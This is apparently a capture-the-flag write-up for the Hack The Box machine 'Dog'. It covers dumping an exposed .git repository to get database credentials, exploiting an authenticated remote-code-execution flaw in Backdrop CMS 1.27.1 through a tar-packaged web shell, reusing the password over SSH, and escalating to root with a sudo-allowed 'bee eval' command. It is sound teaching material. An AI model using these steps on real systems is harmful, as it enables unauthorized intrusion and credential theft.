# Dog

### **Initial Steps**

Starting with an Nmap scan, as always:

```sh
nmap -sC -sV 10.10.11.58
```

Luckily, the scan exposed a **.git** repository. Let's dump it and search for any credentials:

```
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)  
|_http-title: Home | Dog  
| http-robots.txt: 22 disallowed entries (15 shown)  
| /core/ /profiles/ /README.md /web.config /admin  
| /comment/reply /filter/tips /node/add /search /user/register  
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
| http-git:  
|   10.10.11.58:80/.git/  
|     Git repository found!  
```

#### **Dumping the Git Repository**

```
python3 git-dumper/git_dumper.py http://10.10.11.58/.git ../boom
```

One of the first things we notice is the **settings.php** file, which contains MySQL credentials:

```sql
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

#### **CMS Login Attempt**

Since logging in as `root` didn't work, I started grepping for any usernames in the dumped files. I found tiffany@dog.htb, which successfully authenticated into Backdrop CMS.

### **Exploiting Backdrop CMS (RCE)**

Backdrop CMS 1.27.1 has a known **Authenticated Remote Command Execution (RCE) vulnerability**:

* **Exploit:** [Backdrop CMS 1.27.1 - Authenticated RCE](https://www.exploit-db.com/exploits/52021)

```python
python3 exploit.py http://10.10.11.58
```

However, this Proof of Concept (PoC) only created a folder for uploads, but I wasn't sure **where** or **how** to upload the shell. So, I searched for a better explanation and found this [detailed article](https://www.turkhackteam.org/konular/backdrop-cms-1-27-1-poc-authenticated-rce-anka-red-team.2067502/).

#### **Bypassing Upload Restrictions**

Visiting `?q=admin/modules/install`, I found that **.zip files were not accepted** due to a missing PHP extension:

`The Zip PHP extension is not loaded on your server. You will not be able to download any projects using Project Installer until this is fixed.`

Instead of a ZIP file, I used another compression format:

**Using a Tar Archive (`.tar`)**

```sh
tar -cvf shell.tar shell/
```

Following the steps in the article, I installed `shell.tar`, then visited:

`http://10.10.11.58/modules/shell/shell.php`

This successfully provided **code execution**! 🚀

***

### **Getting User Access**

Since we have a password from **settings.php**, let's check `/etc/passwd` for valid users and try SSH access:

```sh
cat /etc/passwd
```

Looking for users with a **bash shell**, I found `johncusack`:

```css
ssh johncusack@dog.htb
Using the MySQL password:
BackDropJ2024DS2024
```

Luckily, the password worked, and we got the **user flag**. **Alhamdulillah!** 🎉

***

### **Privilege Escalation - Getting Root**

As always, once we gain a shell, the first thing to check is:

```sh
sudo -l
```

The user john can run `(ALL : ALL) /usr/local/bin/bee` as root , lets understand it.

This script (`bee`) is a command-line utility for **Backdrop CMS**, which is a content management system similar to Drupal. It provides a command-line interface (CLI) for managing the CMS.

Lets check the help :

```sh
/usr/local/bin/bee --help
```

notice that we can call EVAL wich is usefull to run php code and read files , even run commands

```sh
/usr/local/bin/bee eval "echo file_get_contents('/root/root.txt');"
```
